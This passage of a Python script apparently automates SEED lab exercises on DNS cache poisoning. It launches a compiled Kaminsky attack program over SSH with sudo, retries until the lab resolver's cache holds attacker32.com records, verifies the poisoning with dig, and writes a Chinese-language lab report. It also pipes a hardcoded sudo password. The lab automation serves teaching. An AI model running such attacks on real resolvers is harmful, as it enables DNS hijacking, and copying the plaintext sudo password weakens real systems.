            self.run_remote(
                f"cd {shlex.quote(self.remote_compose_dir)}/volumes && echo dees | sudo -S timeout 30s ./attack > attack-run.log 2>&1 || true",
                f"运行 Kaminsky 攻击 attempt {attempt}",
                "在宿主机上以 sudo 运行编译后的攻击程序，利用随机子域名反复触发并投毒",
                human_command="echo dees | sudo -S timeout 30s ./attack",
                allow_fail=True,
            )
            cache_dump = self.dump_dns_cache(f"远程攻击缓存导出 attempt {attempt}")
            grep_output = self.run_remote_container(
                "local-dns-server-10.9.0.53",
                "grep -n 'attacker32.com\\|example.com' /var/cache/bind/dump.db || true",
                f"远程攻击缓存筛选 attempt {attempt}",
                "筛选缓存中的关键 NS 记录",
                allow_fail=True,
            ).stdout
            attack_log = self.run_remote(
                f"cd {shlex.quote(self.remote_compose_dir)}/volumes && tail -n 40 attack-run.log || true",
                f"读取 Kaminsky 攻击日志 attempt {attempt}",
                "从宿主机挂载目录读取攻击程序日志",
                human_command="tail -n 40 attack-run.log",
                allow_fail=True,
            ).stdout
            if "attacker32.com" in cache_dump:
                success = {
                    "attempt": attempt,
                    "cache_dump": cache_dump,
                    "grep_output": grep_output,
                    "attack_log": attack_log,
                }
                break
            self.add_issue(f"Kaminsky 攻击第 {attempt} 次尝试未成功，已自动重试。")

        if not success:
            raise RunnerError("Kaminsky 攻击在自动重试后仍未成功")

        user_result = self.user_dig("dig +short www.example.com && dig +short @ns.attacker32.com www.example.com", "验证远程攻击结果")
        if "1.2.3.5" not in user_result:
            raise RunnerError("远程攻击后的 dig 结果没有对齐到攻击者域名服务器")

        self.add_analysis(
            "远程 Kaminsky 攻击结果",
            textwrap.dedent(
                f"""\
                第 {success['attempt']} 次尝试成功。
                缓存筛选:
                {short_block(success['grep_output'])}

                用户侧 dig 对比:
                {short_block(user_result)}
                """
            ),
        )
        self.summary["status"] = "completed"
        self.summary["completed_at"] = dt.datetime.now().isoformat(timespec="seconds")
        self._save_summary()
        self.render_report()
        self.teardown_compose()
        return success

    def render_report(self):
        materials_table = markdown_table(["项目", "路径", "状态", "说明"], self.summary.get("materials", [])) if self.summary.get("materials") else "无"
        preflight_table = markdown_table(["检查项", "结果", "详情"], self.summary.get("preflight", {}).get("checks", [])) if self.summary.get("preflight", {}).get("checks") else "无"
        step_lines = []
        for index, step in enumerate(self.summary["steps"], start=1):
            step_lines.append(f"### {index}. {step['title']}")
            step_lines.append(f"- 状态：{step['status']}")
            step_lines.append(f"- 说明：{step['description']}")
            step_lines.append(f"- 面向用户的命令表达：`{step['human_command']}`")
            step_lines.append(f"- 实际执行：`{step['actual_command']}`")
            step_lines.append(f"- 关键输出：\n\n```text\n{step['result_preview']}\n```")
            step_lines.append(f"- 证据：`{step['log_path']}`")

        code_lines = "\n".join(f"- `{path}`" for path in self.summary.get("generated_files", [])) or "- 无"
        analysis_lines = []
        for item in self.summary.get("analysis_notes", []):
            analysis_lines.append(f"### {item['title']}\n\n{item['body']}")
        if not analysis_lines:
            analysis_lines.append("无")
        issue_lines = "\n".join(f"- {item}" for item in self.summary.get("issues", [])) or "无"
        quiz_lines = "\n".join(f"{idx}. {prompt}" for idx, prompt in enumerate(self.manifest.get("quiz_prompts", []), start=1)) or "无"
        report = "\n".join(
            [
                f"# {self.profile_id} 实验报告",
                "",
                "## 实验总结",
                "",
                f"- Profile: `{self.profile_id}`",
                f"- Run ID: `{self.run_id}`",
                f"- 目标 VM: `{SSH_TARGET}` over port `{SSH_PORT}`",
                f"- 当前状态: `{self.summary.get('status', 'unknown')}`",
                "- 说明: 自动完成材料审查、前置环境验证、实验执行、证据采集与留档。",
                "",
                "## 材料审查表",
                "",
                materials_table,
                "",
                "## 前置环境表",
                "",
                preflight_table,
                "",
                "## 逐任务执行记录",
                "",
                "\n\n".join(step_lines) if step_lines else "无",
                "",
                "## 结果与证据",
                "",
                "\n\n".join(analysis_lines),
                "",
                "## 实验成果留档",
                "",
                code_lines,
                "",
                "## 问题陈述",
                "",
                issue_lines,
                "",
                "## 思考题与解释",
                "",
                "- 本次报告将关键解释并入“结果与证据”章节，避免重复叙述。",
                "",
                "## 附加 Quiz",
                "",
                quiz_lines,
                "",
            ]
        )
        self.report_path.write_text(report, encoding="utf-8")
        self._save_summary()

    def full_run(self):
        try:
            self.run_preflight()
            self.sync_setup()
            if self.profile_id == "lab4-dns-local":
                return self.execute_lab4_dns_local()
            if self.profile_id == "lab4-dns-remote":
                return self.execute_lab4_dns_remote()
            raise RunnerError(f"Unsupported profile: {self.profile_id}")
        except Exception as exc:
            self.summary["status"] = "failed"
            self.summary["completed_at"] = dt.datetime.now().isoformat(timespec="seconds")
            self.add_issue(str(exc))
            self.render_report()
            raise

    def collect_report(self):
        if not self.summary_path.exists():
            raise RunnerError(f"找不到 run summary: {self.summary_path}")
        self.summary = json.loads(self.summary_path.read_text(encoding="utf-8"))
        self.render_report()
        return self.report_path


def build_parser():
    parser = argparse.ArgumentParser(description="Run ZJU SEED lab workflows end-to-end.")
    subparsers = parser.add_subparsers(dest="command", required=True)

    def add_common(subparser, include_run_id=False):
        subparser.add_argument("--profile", required=True, choices=["lab4-dns-local", "lab4-dns-remote"])
        subparser.add_argument("--repo-root", required=True)
        if include_run_id:
            subparser.add_argument("--run-id", required=True)

    add_common(subparsers.add_parser("preflight"))
    add_common(subparsers.add_parser("full-run"))
    add_common(subparsers.add_parser("collect-report"), include_run_id=True)
    return parser


def main():
    parser = build_parser()
    args = parser.parse_args()
    runner = SeedLabRunner(args.profile, args.repo_root, getattr(args, "run_id", None))
    if args.command == "preflight":
        runner.run_preflight()
        print(runner.report_path)
        return 0
    if args.command == "full-run":
        runner.full_run()
        print(runner.report_path)
        return 0
    if args.command == "collect-report":
        print(runner.collect_report())
        return 0
    parser.error(f"Unknown command: {args.command}")
    return 1


if __name__ == "__main__":
    sys.exit(main())
